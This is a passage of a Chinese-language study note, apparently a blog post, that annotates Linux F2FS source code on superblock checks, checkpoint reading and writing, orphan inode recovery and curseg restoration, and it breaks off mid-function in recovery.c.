<h3 id="parse-options-解析属性，与f2fs-show-options关联，认为两者与项目无关"><a href="#parse-options-解析属性，与f2fs-show-options关联，认为两者与项目无关" class="headerlink" title="parse_options // 解析属性，与f2fs_show_options关联，认为两者与项目无关"></a>parse_options // 解析属性，与f2fs_show_options关联，认为两者与项目无关</h3><h3 id="max-file-size-通过索引节点中的地址指针，直接块中的地址指针，间接块中的节点ID计算最大文件大小"><a href="#max-file-size-通过索引节点中的地址指针，直接块中的地址指针，间接块中的节点ID计算最大文件大小" class="headerlink" title="max_file_size // 通过索引节点中的地址指针，直接块中的地址指针，间接块中的节点ID计算最大文件大小"></a>max_file_size // 通过索引节点中的地址指针，直接块中的地址指针，间接块中的节点ID计算最大文件大小</h3><h3 id="sanity-check-raw-super-原始super的健全性检查"><a href="#sanity-check-raw-super-原始super的健全性检查" class="headerlink" title="sanity_check_raw_super // 原始super的健全性检查"></a>sanity_check_raw_super // 原始super的健全性检查</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sanity_check_raw_super</span><span class="params">(struct f2fs_super_block *raw_super)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> blocksize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查魔数magic是否为F2FS_SUPER_MAGIC</span></span><br><span class="line">    <span class="keyword">if</span> (F2FS_SUPER_MAGIC != le32_to_cpu(raw_super-&gt;magic))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    blocksize = <span class="number">1</span> &lt;&lt; le32_to_cpu(raw_super-&gt;log_blocksize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 检查块大小和页大小是否一致（f2fs文件系统的设计上是一致的）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (blocksize != PAGE_CACHE_SIZE)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="sanity-check-ckpt-checkpoint的健全性检查"><a href="#sanity-check-ckpt-checkpoint的健全性检查" class="headerlink" title="sanity_check_ckpt // checkpoint的健全性检查"></a>sanity_check_ckpt // checkpoint的健全性检查</h3><p>如果ckpt, sit, nat, ssa各自的segment数之和加上gc的保留段数 小于等于 segment总数，则通过健全性检查</p>
<h3 id="init-sb-info-对f2fs-sb-info进行初始化"><a href="#init-sb-info-对f2fs-sb-info进行初始化" class="headerlink" title="init_sb_info // 对f2fs_sb_info进行初始化"></a>init_sb_info // 对f2fs_sb_info进行初始化</h3><h3 id="f2fs-fill-super-读取磁盘的前端区域的数据，对F2FS元区域数据进行初始化"><a href="#f2fs-fill-super-读取磁盘的前端区域的数据，对F2FS元区域数据进行初始化" class="headerlink" title="f2fs_fill_super // 读取磁盘的前端区域的数据，对F2FS元区域数据进行初始化"></a>f2fs_fill_super // 读取磁盘的前端区域的数据，对F2FS元区域数据进行初始化</h3><p><code>f2fs_fill_super</code> 是加载F2FS文件系统的第一步，主要<strong>作用</strong>是读取磁盘的前端区域的数据，对F2FS元区域数据进行初始化。  </p>
<blockquote>
<p>1 首先调用<code>kzalloc</code>为特定f2fs的超级块信息分配内存<br>2 设定一个临时的块大小<br>3 调用<code>sb_bread</code>读取原始超级块的信息<br>4 调用<code>set_opt</code>初始化FS参数<br>5 调用<code>parse_options</code>解析安装属性<br>6 对原始super进行健全性检查<br>7 初始化特定的超级块信息，如用于gc, cp, write_inode, writepages的互斥量<br>8 调用<code>f2fs_iget</code>获取元空间的索引节点<br>9 对cp做健全性检查<br>10 调用<code>init_orphan_info</code>初始化超级块orphan信息<br>11 依次调用<code>build_segment_manager</code>, <code>build_node_manager</code>, <code>build_gc_manager</code>设置f2fs内部模块<br>12 调用<code>recover_orphan_inodes</code>恢复孤立节点，有则释放它们<br>13 调用<code>f2fs_iget</code>获取根索引节点和目录项<br>14 调用<code>recover_fsync_data</code>恢复（与数据的同步写入磁盘相关）<br>15 运行后台GC线程</p>
</blockquote>
<p>这个初始化函数中与后滚恢复相关的函数有<code>get_valid_checkpoint</code>和<code>build_segment_manager</code>,分别对应<code>f2fs_checkpoint</code>相关的数据和curseg相关的数据  </p>
<h4 id="get-valid-checkpoint-恢复f2fs-checkpoint"><a href="#get-valid-checkpoint-恢复f2fs-checkpoint" class="headerlink" title="get_valid_checkpoint // 恢复f2fs_checkpoint"></a>get_valid_checkpoint // 恢复<code>f2fs_checkpoint</code></h4><p><strong>定义</strong>在fs/f2fs/checkpoint.c中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// struct f2fs_sb_info在/fs/f2fs/f2fs.h中</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_valid_checkpoint</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_checkpoint</span> *<span class="title">cp_block</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * sbi指向f2fs_sb_info结构体的子数据raw_super, 是一个原始超级块指针</span></span><br><span class="line"><span class="comment">     * raw_super指向f2fs_super_block类型的任意结构体</span></span><br><span class="line"><span class="comment">     * 这里相当于fsb就是原来的超级块指针</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_super_block</span> *<span class="title">fsb</span> =</span> sbi-&gt;raw_super;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">cp1</span>, *<span class="title">cp2</span>, *<span class="title">cur_page</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> blk_size = vsbi-&gt;blocksize;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cp1_version = <span class="number">0</span>, cp2_version = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cp_start_blk_no;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * kzalloc在include/linux/slab.h中</span></span><br><span class="line"><span class="comment">     * blk_size是需要分配的内存大小, GFP_KERNEL为要分配的内存类型</span></span><br><span class="line"><span class="comment">     * 查询&quot;内存分配掩码&quot;知: GFP_KERNEL是一种常规的分配方式，可能会阻塞。</span></span><br><span class="line"><span class="comment">     * 这个标志在睡眠安全时用在进程的长下文代码中。</span></span><br><span class="line"><span class="comment">     * 为了获取调用者所需的内存，内核会尽力而为。这个标志应该是首选标志.</span></span><br><span class="line"><span class="comment">     * ckpt是原始checkpoint指针, 指向f2fs_checkpoint类型的任意结构体</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    sbi-&gt;ckpt = kzalloc(blk_size, GFP_KERNEL); <span class="comment">// 分配f2fs_checkpoint的堆空间</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如上述操作未完成, 说明内存不足</span></span><br><span class="line">    <span class="keyword">if</span> (!sbi-&gt;ckpt)</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 找到并读取两个cp</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    cp_start_blk_no = le64_to_cpu(fsb-&gt;start_segment_checkpoint); <span class="comment">// 从sbi获得checkpoint的起始地址</span></span><br><span class="line">    cp1 = validate_checkpoint(sbi, cp_start_blk_no, &amp;cp1_version); <span class="comment">// 读取该地址并检查其合法性</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The second checkpoint pack should start at the next segment */</span></span><br><span class="line">    cp_start_blk_no += <span class="number">1</span> &lt;&lt; le32_to_cpu(fsb-&gt;log_blocks_per_seg);</span><br><span class="line">    cp2 = validate_checkpoint(sbi, cp_start_blk_no, &amp;cp2_version);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cp1 &amp;&amp; cp2) &#123; <span class="comment">// 根据版本的高低决定使用哪个版本的cp</span></span><br><span class="line">        <span class="keyword">if</span> (ver_after(cp2_version, cp1_version))</span><br><span class="line">            cur_page = cp2;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            cur_page = cp1;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cp1) &#123;</span><br><span class="line">        cur_page = cp1;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cp2) &#123;</span><br><span class="line">        cur_page = cp2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">goto</span> fail_no_cp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// page_address返回页面的虚拟地址, 这个cur_page就是以上获取的正在使用的checkpoint</span></span><br><span class="line">    cp_block = (struct f2fs_checkpoint *)page_address(cur_page);</span><br><span class="line">    <span class="built_in">memcpy</span>(sbi-&gt;ckpt, cp_block, blk_size); <span class="comment">// 复制数据到sbi中，用于运行中的管理</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* f2fs_put_page在/fs/f2fs/f2fs.h中</span></span><br><span class="line"><span class="comment">     * 查看!PageLocked(cp1)和!PageLocked(cp1)时的堆栈信息.</span></span><br><span class="line"><span class="comment">     * 解除cp1和cp2的锁定并释放页面缓存</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    f2fs_put_page(cp1, <span class="number">1</span>);</span><br><span class="line">    f2fs_put_page(cp2, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fail_no_cp:</span><br><span class="line">    kfree(sbi-&gt;ckpt);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="build-segment-manager-恢复curseg"><a href="#build-segment-manager-恢复curseg" class="headerlink" title="build_segment_manager // 恢复curseg"></a>build_segment_manager // 恢复curseg</h4><p>恢复curseg的功能主要在<code>build_segment_manager</code>函数的<code>build_curseg</code>函数中完成<br>build_segment_manager和build_curseg<strong>定义</strong>在fs/f2fs/segment.c  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">build_curseg</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">curseg_info</span> *<span class="title">array</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">array</span> = kzalloc(<span class="keyword">sizeof</span>(*<span class="built_in">array</span>) * NR_CURSEG_TYPE, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">array</span>)</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">    SM_I(sbi)-&gt;curseg_array = <span class="built_in">array</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化curseg的空间</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_CURSEG_TYPE; i++) &#123;</span><br><span class="line">        mutex_init(&amp;<span class="built_in">array</span>[i].curseg_mutex);</span><br><span class="line">        <span class="built_in">array</span>[i].sum_blk = kzalloc(PAGE_CACHE_SIZE, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">array</span>[i].sum_blk)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="built_in">array</span>[i].segno = NULL_SEGNO;</span><br><span class="line">        <span class="built_in">array</span>[i].next_blkoff = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从磁盘中，读取恢复curseg的信息</span></span><br><span class="line">    <span class="keyword">return</span> restore_curseg_summaries(sbi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="restore-curseg-summaries-读取curseg"><a href="#restore-curseg-summaries-读取curseg" class="headerlink" title="restore_curseg_summaries // 读取curseg"></a>restore_curseg_summaries // 读取curseg</h5><p>function in /fs/f2fs/segment.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">restore_curseg_summaries</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> type = CURSEG_HOT_DATA;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 检查CP_COMPACT_SUM_FLAG的标志，这个标志用于检查是否按COMPACTED的方式读取data summary</span></span><br><span class="line"><span class="comment">     * is_set_ckpt_flags fs/f2fs/f2fs.h, line 467 (as a function)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (is_set_ckpt_flags(F2FS_CKPT(sbi), CP_COMPACT_SUM_FLAG)) &#123;</span><br><span class="line">        <span class="comment">/* restore for compacted data summary */</span></span><br><span class="line">        <span class="keyword">if</span> (read_compacted_summaries(sbi))</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        type = CURSEG_HOT_NODE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 如果没有COMPACTED标识，则DATA和NODE都使用NORMAL的方式进行恢复</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (; type &lt;= CURSEG_COLD_NODE; type++)</span><br><span class="line">        <span class="keyword">if</span> (read_normal_summaries(sbi, type))</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="read-normal-summaries-读取summaries"><a href="#read-normal-summaries-读取summaries" class="headerlink" title="read_normal_summaries //读取summaries"></a>read_normal_summaries //读取summaries</h6><p>这个函数对于F2FS的正常关闭，重新启动时读取的summary的方式都是类似的，都是根据HOT/WARM/COLD的顺序，读取对应的block，然后将数据保存到curseg对应的类型当中。这里<strong>重点考虑出现了宕机的情况的恢复</strong>。</p>
<hr>
<h2 id="checkpoint-c"><a href="#checkpoint-c" class="headerlink" title="checkpoint.c"></a>checkpoint.c</h2><h3 id="grab-meta-page-和-get-meta-page-获取元页面"><a href="#grab-meta-page-和-get-meta-page-获取元页面" class="headerlink" title="grab_meta_page 和 get_meta_page// 获取元页面"></a>grab_meta_page 和 get_meta_page// 获取元页面</h3><p>不同之处在于，<code>grab_meta_page</code>在返回给定缓存中给定索引处的锁定页面后，调用<code>wait_on_page_writeback</code>等待页面完成回写再<code>SetPageUptodate</code>更新页面，然后返回page<br>而<code>get_meta_page</code>，在返回给定缓存中给定索引处的锁定页面后，调用<code>mark_page_accessed</code>将页面标记为可访问，然后返回page</p>
<hr>
<p>f2fs_write_meta_page f2fs_write_meta_pages sync_meta_pages与写页面相关</p>
<hr>
<h3 id="f2fs-set-meta-page-dirty-设置元页面为脏"><a href="#f2fs-set-meta-page-dirty-设置元页面为脏" class="headerlink" title="f2fs_set_meta_page_dirty // 设置元页面为脏"></a>f2fs_set_meta_page_dirty // 设置元页面为脏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">f2fs_set_meta_page_dirty</span><span class="params">(struct page *page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span> =</span> page-&gt;mapping;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_sb_info</span> *<span class="title">sbi</span> =</span> F2FS_SB(mapping-&gt;host-&gt;i_sb);</span><br><span class="line"></span><br><span class="line">    SetPageUptodate(page); <span class="comment">// 更新页面</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 如果该page不是脏页，则调用__set_page_dirty_nobuffers将页面设置为脏，但不是所有缓冲区都设置为脏</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!PageDirty(page)) &#123;</span><br><span class="line">        __set_page_dirty_nobuffers(page);</span><br><span class="line">        inc_page_count(sbi, F2FS_DIRTY_META);</span><br><span class="line">        F2FS_SET_SB_DIRT(sbi);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="check-orphan-space-检查孤立空间大小"><a href="#check-orphan-space-检查孤立空间大小" class="headerlink" title="check_orphan_space // 检查孤立空间大小"></a>check_orphan_space // 检查孤立空间大小</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_orphan_space</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> max_orphans;</span><br><span class="line">    <span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 考虑段中的512个块，cp和log段摘要需要5个块</span></span><br><span class="line"><span class="comment">     * 剩余的块用于保留有限的orphan entries，为cp pack保留一个段，我们最多可以有1020 * 507个orphan entries</span></span><br><span class="line"><span class="comment">     * F2FS_ORPHANS_PER_BLOCK用于孤立索引节点的管理(#define F2FS_ORPHANS_PER_BLOCK 1020)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    max_orphans = (sbi-&gt;blocks_per_seg - <span class="number">5</span>) * F2FS_ORPHANS_PER_BLOCK;</span><br><span class="line">    mutex_lock(&amp;sbi-&gt;orphan_inode_mutex); <span class="comment">// 获取互斥量</span></span><br><span class="line">    <span class="keyword">if</span> (sbi-&gt;n_orphans &gt;= max_orphans)</span><br><span class="line">    err = -ENOSPC;</span><br><span class="line">    mutex_unlock(&amp;sbi-&gt;orphan_inode_mutex); <span class="comment">// 释放此前被锁定的互斥量</span></span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="add-orphan-inode"><a href="#add-orphan-inode" class="headerlink" title="add_orphan_inode"></a>add_orphan_inode</h3><h3 id="remove-orphan-inode"><a href="#remove-orphan-inode" class="headerlink" title="remove_orphan_inode"></a>remove_orphan_inode</h3><h3 id="recover-orphan-inode-恢复孤立索引节点"><a href="#recover-orphan-inode-恢复孤立索引节点" class="headerlink" title="recover_orphan_inode // 恢复孤立索引节点"></a>recover_orphan_inode // 恢复孤立索引节点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">recover_orphan_inode</span><span class="params">(struct f2fs_sb_info *sbi, <span class="keyword">nid_t</span> ino)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> f2fs_iget(sbi-&gt;sb, ino); <span class="comment">// 获取元空间的索引节点</span></span><br><span class="line">    BUG_ON(IS_ERR(inode)); <span class="comment">// 查看 inode指针未指向最后一个page 时的堆栈内容</span></span><br><span class="line">    clear_nlink(inode); <span class="comment">// 直接将索引节点的链接数清零</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 调用iput截断所有数据 */</span></span><br><span class="line">    iput(inode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="recover-orphan-inodes"><a href="#recover-orphan-inodes" class="headerlink" title="recover_orphan_inodes"></a>recover_orphan_inodes</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">recover_orphan_inodes</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">block_t</span> start_blk, orphan_blkaddr, i, j;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果umount和journal_present标志值为0则直接return 0</span></span><br><span class="line">    <span class="keyword">if</span> (!(F2FS_CKPT(sbi)-&gt;ckpt_flags &amp; CP_ORPHAN_PRESENT_FLAG))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    sbi-&gt;por_doing = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 获取块起始地址和orphan块地址</span></span><br><span class="line">    start_blk = __start_cp_addr(sbi) + <span class="number">1</span>;</span><br><span class="line">    orphan_blkaddr = __start_sum_addr(sbi) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; orphan_blkaddr; i++) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> get_meta_page(sbi, start_blk + i);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_orphan_block</span> *<span class="title">orphan_blk</span>;</span></span><br><span class="line"></span><br><span class="line">        orphan_blk = (struct f2fs_orphan_block *)page_address(page);</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; le32_to_cpu(orphan_blk-&gt;entry_count); j++) &#123;</span><br><span class="line">            <span class="keyword">nid_t</span> ino = le32_to_cpu(orphan_blk-&gt;ino[j]);</span><br><span class="line">            recover_orphan_inode(sbi, ino);</span><br><span class="line">        &#125;</span><br><span class="line">        f2fs_put_page(page, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* clear Orphan Flag */</span></span><br><span class="line">    F2FS_CKPT(sbi)-&gt;ckpt_flags &amp;= (~CP_ORPHAN_PRESENT_FLAG);</span><br><span class="line">    sbi-&gt;por_doing = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="get-valid-checkpoint-获取有效的checkpoint"><a href="#get-valid-checkpoint-获取有效的checkpoint" class="headerlink" title="get_valid_checkpoint // 获取有效的checkpoint"></a>get_valid_checkpoint // 获取有效的checkpoint</h3><p>在<code>f2fs_fill_super</code>中已介绍</p>
<h3 id="do-checkpoint"><a href="#do-checkpoint" class="headerlink" title="do_checkpoint"></a>do_checkpoint</h3><p>首先刷新所有的NAT/SIT页面，然后根据curseg修改checkpoint的信息和summary的信息。<br><strong>修改checkpoint</strong>：对<code>f2fs_checkpoint</code>的修改主要是把curseg的当前segno，blkoff等写入到<code>f2fs_checkpoint</code>中，以便下次重启时可以根据这些信息，重建curseg。  </p>
<p><strong>summary的回写</strong>：根据需要回写的summary的数目，返回需要写回的block的数目<code>data_sum_blocks</code>，如果data_sum_blocks = 1 或者 2，则表示回写1个或者2个block，则设置CP_COMPACT_SUM_FLAG标志。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">data_sum_blocks = npages_for_summary_flush(sbi);</span><br><span class="line"><span class="keyword">if</span> (data_sum_blocks &lt; <span class="number">3</span>)</span><br><span class="line">    ckpt-&gt;ckpt_flags |= CP_COMPACT_SUM_FLAG;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    ckpt-&gt;ckpt_flags &amp;= (~CP_COMPACT_SUM_FLAG);</span><br></pre></td></tr></table></figure>
<p>然后调用<strong>write_data_summaries</strong>将summary写入磁盘。<br><code>write_data_summaries(sbi, start_blk);//将data summary以及里面的journal写入磁盘</code><br><code>write_data_summaries</code>函数会判断一下是否设置了CP_COMPACT_SUM_FLAG标志，采取不同的方法写入磁盘。  </p>
<h3 id="write-checkpoint-写checkpoint"><a href="#write-checkpoint-写checkpoint" class="headerlink" title="write_checkpoint // 写checkpoint"></a>write_checkpoint // 写checkpoint</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_checkpoint</span><span class="params">(struct f2fs_sb_info *sbi, <span class="keyword">bool</span> blocked, <span class="keyword">bool</span> is_umount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_checkpoint</span> *<span class="title">ckpt</span> =</span> F2FS_CKPT(sbi);<span class="comment">//从sbi读取当前cp的数据结构</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ckpt_ver;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!blocked) &#123;</span><br><span class="line">    mutex_lock(&amp;sbi-&gt;cp_mutex);</span><br><span class="line">    block_operations(sbi);<span class="comment">//将文件系统的所有操作停止</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *按照DATA, NODE, META的顺序将数据从page同步写入到磁盘</span></span><br><span class="line"><span class="comment">     *（META包括了SIT/NAT/checkpoint）</span></span><br><span class="line"><span class="comment">     *这里写入磁盘的meta并不是最新的meta</span></span><br><span class="line"><span class="comment">     *（可能是在此之前使用fsync/fdatasync时触发了checkpoint，meta还没有完全写入磁盘时起到阻塞的作用）</span></span><br><span class="line"><span class="comment">     *最新的meta还只保存在cache中</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    f2fs_submit_bio(sbi, DATA, <span class="literal">true</span>);</span><br><span class="line">    f2fs_submit_bio(sbi, NODE, <span class="literal">true</span>);</span><br><span class="line">    f2fs_submit_bio(sbi, META, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 完成数据的写入后更新更新版本号</span></span><br><span class="line"><span class="comment">     * 以便于SIT entries和seg summaries写入正确的位置</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ckpt_ver = le64_to_cpu(ckpt-&gt;checkpoint_ver);</span><br><span class="line">    ckpt-&gt;checkpoint_ver = cpu_to_le64(++ckpt_ver);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 更新元数据的NAT区域, SIT区域</span></span><br><span class="line"><span class="comment">     * 刷写所有nat entries, sit entries到磁盘</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    flush_nat_entries(sbi);</span><br><span class="line">    flush_sit_entries(sbi);</span><br><span class="line"></span><br><span class="line">    reset_victim_segmap(sbi);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* unlock all the fs_lock[] in do_checkpoint()</span></span><br><span class="line"><span class="comment">     * 调用do_checkpoint()将最新的元数据Checkpoint区域以及Summary区域写入磁盘</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    do_checkpoint(sbi, is_umount);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复文件系统的操作</span></span><br><span class="line">    unblock_operations(sbi);</span><br><span class="line">    mutex_unlock(&amp;sbi-&gt;cp_mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="recovery-c"><a href="#recovery-c" class="headerlink" title="recovery.c"></a>recovery.c</h2><h3 id="space-for-roll-forward-是否可以前滚回复"><a href="#space-for-roll-forward-是否可以前滚回复" class="headerlink" title="space_for_roll_forward // 是否可以前滚回复"></a>space_for_roll_forward // 是否可以前滚回复</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">space_for_roll_forward</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 最后有效块数与分配有效块数之和小于等于用户块数，返回true</span></span><br><span class="line">    <span class="keyword">if</span> (sbi-&gt;last_valid_block_count + sbi-&gt;alloc_valid_block_count</span><br><span class="line">        &gt; sbi-&gt;user_block_count)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="get-fsync-inode-获取fsync索引节点"><a href="#get-fsync-inode-获取fsync索引节点" class="headerlink" title="get_fsync_inode // 获取fsync索引节点"></a>get_fsync_inode // 获取fsync索引节点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回一个entry(获取fsync索引节点)</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct fsync_inode_entry *<span class="title">get_fsync_inode</span><span class="params">(struct list_head *head,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">nid_t</span> ino)</span> <span class="comment">// typedef u32 nid_t</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">this</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fsync_inode_entry</span> *<span class="title">entry</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历列表，struct list_head做循环游标，head为列表头</span></span><br><span class="line">    list_for_each(<span class="keyword">this</span>, 